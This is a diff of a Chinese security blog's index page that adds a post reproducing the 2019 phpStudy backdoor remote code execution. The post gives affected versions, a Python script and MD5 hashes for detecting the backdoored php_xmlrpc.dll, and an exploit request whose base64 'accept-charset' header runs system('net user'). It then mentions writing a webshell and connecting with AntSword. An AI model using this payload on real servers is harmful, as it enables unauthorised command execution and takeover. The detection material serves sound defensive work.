@@ -259,6 +259,191 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/phpstudy后门RCE复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Guko">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guko's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/24/phpstudy后门RCE复现/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-24T15:42:55+08:00">
+                2019-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  701 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="phpstudy后门RCE复现"><a href="#phpstudy后门RCE复现" class="headerlink" title="phpstudy后门RCE复现"></a>phpstudy后门RCE复现</h2><h4 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h4><p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户</p>
+<p>9月20日杭州公安微信公众账号发布了“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”的文章，文章里说明phpstudy存在“后门”</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>软件作者声明phpstudy 2016版PHP5.4存在后门。</p>
+<p>实际测试官网下载phpstudy2018版php-5.2.17和php-5.4.45也同样存在后门</p>
+<h4 id="后门检测方法"><a href="#后门检测方法" class="headerlink" title="后门检测方法"></a>后门检测方法</h4><p>通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中<br>phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45<br>phpStudy2016路径<br>php\php-5.2.17\ext\php_xmlrpc.dll<br>php\php-5.4.45\ext\php_xmlrpc.dll<br>phpStudy2018路径<br>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll<br>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dl</p>
+<p>用记事本打开此文件查找@eval,文件存在@eval(%s(‘%s’)),确认存在漏洞</p>
+<p><img src="/2019/09/24/phpstudy后门RCE复现/1.png" alt="1"></p>
+<p>python脚本检测程序如下：<br><img src="/2019/09/24/phpstudy后门RCE复现/2.png" alt="2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">#__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">#__blog__=&apos;http://pcat.cc&apos;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def strings(file) :</span><br><span class="line">    chars = string.printable[:94]</span><br><span class="line">    shortestReturnChar = 4</span><br><span class="line">    regExp = &apos;[%s]&#123;%d,&#125;&apos; % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.compile(regExp)</span><br><span class="line">    with open(file, &apos;rb&apos;) as f:</span><br><span class="line">        return pattern.findall(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def grep(lines,pattern):</span><br><span class="line">    for line in lines:</span><br><span class="line">        if pattern in line:</span><br><span class="line">            yield line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pcheck(filename):</span><br><span class="line">    # trojan feature</span><br><span class="line">    trojan=&apos;@eval&apos;</span><br><span class="line">    # just check dll file</span><br><span class="line">    if filename.endswith(&apos;.dll&apos;):        </span><br><span class="line">        lines=strings(filename)</span><br><span class="line">        try:</span><br><span class="line">            grep(lines,trojan).next()</span><br><span class="line">        except:</span><br><span class="line">            return</span><br><span class="line">        print &apos;=== &#123;0&#125; ===&apos;.format(filename)</span><br><span class="line">        for line in grep(lines,trojan):</span><br><span class="line">            print line</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    # . stand for current directory</span><br><span class="line">    for path, dirs, files in os.walk(&quot;.&quot;, topdown=False):</span><br><span class="line">        for name in files:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">        for name in dirs:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    foo()</span><br></pre></td></tr></table></figure>
+
+<p>附后门文件MD5值：</p>
+<p>MD5: 0F7AD38E7A9857523DFBCE4BCE43A9E9<br>MD5: C339482FD2B233FB0A555B629C0EA5D5</p>
+<h4 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h4><p>将含有后门的phpstudy运行起来，php-5.2.17、php-5.4.45都存在漏洞，这里我们选择php-5.2.17，然后访问网站</p>
+<p><img src="/2019/09/24/phpstudy后门RCE复现/3.png" alt="3"></p>
+<p><img src="/2019/09/24/phpstudy后门RCE复现/4.png" alt="4"></p>
+<p>通过bp抓取访问包，修改请求包内容，直接触发远程命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none,</span><br><span class="line">accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/24/phpstudy后门RCE复现/5.png" alt="5"></p>
+<p>这里最主要的是这如下两个字段<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Encoding: gzip,deflate</p>
+<pre><code>
+既然能执行命令了就可以写shell了，把一句话经过base64编码后，直接写入,然后中国蚁剑连接即可
+
+![6](phpstudy后门RCE复现/6.png)
+
+![7](phpstudy后门RCE复现/7.png)
+
+
+
+参考链接
+
+[phpstudy后门rce批量利用脚本](https://secquan.org/Discuss/1070323)
+
+[Phpstudy隐藏后门](https://blog.csdn.net/qq_41770175/article/details/101277851)
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/phpcms9-6-1任意文件下载poc编写/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1771,162 +1956,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/28/记一次捕获野生0day/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Guko">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Guko's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/06/28/记一次捕获野生0day/" itemprop="url">记一次捕获野生0day</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-28T19:33:22+08:00">
-                2019-06-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  838 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>危害级别：【危急】<br>验证版本：<br>A8+V7.0 SP3、A8+ V6.1 SP2<br>触发条件：没有限制</p>
-<p>在大型真人团体实战对抗演练倒数第三天，发现攻击方异常凶猛，各种藏着捂着的招式都使用出来了，突然发现被上传shell的告警，吓的我赶紧去分析分析看看攻击队是怎么进来的。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/06/28/记一次捕获野生0day/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1977,7 +2006,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2064,7 +2093,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">181.3k</span>
+    <span title="Site words total count">182k</span>
   
 </div>
 
